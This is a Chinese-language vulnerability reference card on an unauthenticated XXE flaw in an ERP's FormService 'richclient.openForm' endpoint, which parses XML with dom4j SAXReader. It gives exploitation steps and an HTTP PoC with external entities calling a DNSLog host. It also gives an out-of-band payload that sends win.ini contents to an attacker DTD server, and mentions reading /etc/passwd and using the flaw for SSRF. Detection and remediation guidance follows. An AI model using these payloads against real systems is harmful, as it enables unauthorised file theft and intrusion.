---
id: web-generic-xxe-artery-erp-richclient-openform
title: Artery ERP richclient.openForm 未授权 XXE：FormService 用 SAXReader 解析外部 XML 实体
type: scenario
domain: web
path: web/generic/xxe
technique: erp-richclient-openform-saxreader-xxe
aliases:
- richclient.openForm XXE
- FormService XXE
- SAXReader 外部实体
- openForm 未授权
- DNSLog XXE
- ERP XXE
tags:
- web
- xxe
- java
- erp
- unauth
- formservice
- dom4j
- saxreader
- oob
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V237
  verified_at: '2026-11-07T09:20:36+08:00'
  notes: 已对照原文核对（33 图）；DNSLog 记录 helloxxe 证实 XXE 外带；未复现。
---

## 一句话结论

ERP 的 `RichClientService#openForm` 通过 FormService 暴露为 `service=richclient.openForm`，第三个参数为 `Document`，FormService 用 `new SAXReader().read(...)` 解析攻击者提交的 XML；`RichClientService.isAccessible` 是空实现（不校验匿名），因此未登录即可提交带外部实体的 XML，原文用 DNSLog 确认 XXE 外带。

## 原理

- FormService 的 `service()` 根据第三个参数类型选择内容解析：
  - `Document` → `contentType=1`，`contentString` 经 `new InputSource(new StringReader(...))` 交给 `new SAXReader().read(source)`；
  - `SAXReader`（dom4j）默认允许 DOCTYPE/外部实体解析，攻击者可在 XML 中声明 `<!ENTITY % remote SYSTEM "http://attacker/dtd">` 并 `%remote;` 引用，触发服务端向攻击者发起 HTTP/DNS 请求。
- `RichClientService implements ISecurityService`，但 `isAccessible(HttpServletRequest, String)` 方法体为空——FormService 调用它时既不抛异常也不校验 `UserContext.checkAnonymous`，等价于匿名放行。
- `openForm` 随后读取 `doc.getRootElement()` 的 `programid`/`formid`/`orgid` 并调用 `Designer.openFormContent(...)`；XXE 发生在进入业务逻辑之前的 XML 解析阶段，即使后续处理报错也不影响实体外带。
- 原文将 XML 作为原始请求体提交，FormService 从请求中取得 `content` 并解析；响应返回错误（`服务[richclient.openForm]提交数据格式有误...`），但 DNSLog 已记录 `helloxxe.<dnslog域名>` 查询，证明外部实体解析成功。

## 触发条件

- 目标部署该 ERP/框架，`/formservice` 可访问，`richclient` 服务存在。
- `RichClientService.isAccessible` 为空/未拦截匿名请求。
- FormService 使用 `SAXReader` 且未禁用 DOCTYPE/外部实体（默认配置）。
- 目标可出网（DNS/HTTP）到攻击者服务器，或可读取本地文件/内网资源（文件型 XXE 需响应可回显或 OOB 外带）。

## 利用步骤

1. 发送 `POST /formservice?service=richclient.openForm`，Content-Type 为 XML（或表单 `content=`），body 为带外部实体的 XML。
2. 使用 DNSLog/HTTP 平台验证：`<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://xxxx.dnslog.cn"> %remote;]><root/>`。
3. 若收到 DNS/HTTP 记录，确认 XXE；进一步尝试参数实体外带文件内容：
   `<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"> <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> %dtd;`，evil.dtd 中把 `%file;` 拼进请求 URL。
4. 也可尝试 `file:///etc/passwd`、`WEB-INF/web.xml`、内网 HTTP 服务（SSRF via XXE）。
5. 记录请求、DNSLog/HTTP 日志与回显内容作为证据。

## PoC

```http
POST /formservice?service=richclient.openForm HTTP/1.1
Host: target
Content-Length: 143

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://helloxxe.09tyen.dnslog.cn"> %remote;]>
<root/>
```

DNSLog 记录（原文）：

```text
helloxxe.09tyen.dnslog.cn   221.231.139.96   2025-07-24 20:51:02
```

响应为错误 XML（`服务[richclient.openForm]提交数据格式有误，错误原因: Connection refused ...`），但外部实体请求已发出。

## 变体与关联

- 变体：原始 XML 请求体或 `content=` 表单参数两种投递方式；`inflate=true` 时可用 Base64+GZIP 绕过 WAF。
- 变体：盲 XXE 外带文件内容（参数实体 + 外部 DTD）、XXE 打内网 HTTP（SSRF）、拒绝服务（实体膨胀，按规则不展开）。
- 关联：FormService 机制 [[web-java-framework-formservice-reflection-dispatch-unauth]]；通用 XXE 卡片见本路径下其他条目；同系统其他 sink 见上传/文件读写/SQLi 卡。
- 边界：`SAXReader` 禁用外部实体/DOCTYPE、`richclient` 服务被鉴权、目标不出网且无法回显时，XXE 不成立。

## 检测与防御

- 检测：`/formservice?service=richclient.openForm` 请求；XML 中出现 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、外部域名；服务端异常出现 `SAXParseException`/`Connection refused`；DNS/HTTP 出站日志异常。
- 修复：`SAXReader` 关闭外部实体与 DTD（`setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`、禁用外部通用/参数实体）；使用安全的 XML 解析器。
- 加固：`RichClientService.isAccessible` 实现匿名校验；FormService 对 XML 内容做白名单/大小限制；限制应用出站访问；错误信息不回显解析细节。
